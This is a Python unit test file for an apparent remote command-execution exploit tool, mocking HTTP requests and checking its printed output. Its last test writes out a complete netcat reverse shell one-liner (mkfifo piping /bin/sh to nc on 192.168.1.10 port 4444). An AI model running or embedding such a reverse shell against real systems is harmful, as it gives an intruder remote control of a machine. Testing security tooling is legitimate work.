# tests/test_exploit.py

import unittest
from unittest.mock import patch, MagicMock
from exploit import Exploit


class TestExploit(unittest.TestCase):
    def setUp(self):
        self.exploit = Exploit("127.0.0.1")

    @patch("exploit.requests.get")
    @patch("exploit.parse_response")
    def test_run_command_success(self, mock_parse_response, mock_requests_get):
        # Mock response
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.text = "some raw HTML"
        mock_requests_get.return_value = mock_response
        mock_parse_response.return_value = "command output"

        # Capture printed output
        with patch("builtins.print") as mock_print:
            self.exploit.run_command("id")
            mock_print.assert_any_call(
                "\033[90mSending request...\033[0m"
            )  # col.LIGHT_GRAY + msg + col.RESET
            mock_print.assert_any_call(
                "\033[92mcommand output\033[0m"
            )  # col.LIGHT_GREEN + output + col.RESET

    @patch("exploit.requests.get")
    @patch("exploit.parse_response")
    def test_run_command_no_output(self, mock_parse_response, mock_requests_get):
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.text = "some raw HTML"
        mock_requests_get.return_value = mock_response
        mock_parse_response.return_value = None

        with patch("builtins.print") as mock_print:
            self.exploit.run_command("id")
            mock_print.assert_any_call("\033[91mNo result\033[0m")

    @patch("exploit.requests.get")
    def test_run_command_http_error(self, mock_requests_get):
        mock_response = MagicMock()
        mock_response.status_code = 500
        mock_requests_get.return_value = mock_response

        with patch("builtins.print") as mock_print:
            self.exploit.run_command("id")
            mock_print.assert_any_call("\033[91mError: Status code 500\033[0m")

    @patch("exploit.requests.get", side_effect=Exception("Connection failed"))
    def test_run_command_request_exception(self, mock_requests_get):
        with patch("builtins.print") as mock_print:
            self.exploit.run_command("id")
            self.assertTrue(
                any(
                    "Request failed" in args[0] for args, _ in mock_print.call_args_list
                )
            )

    def test_generate_reverse_shell(self):
        lhost = "192.168.1.10"
        lport = "4444"
        result = self.exploit.generate_reverse_shell(lhost, lport)
        expected = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.10 4444 >/tmp/f"
        self.assertEqual(result, expected)


if __name__ == "__main__":
    unittest.main()
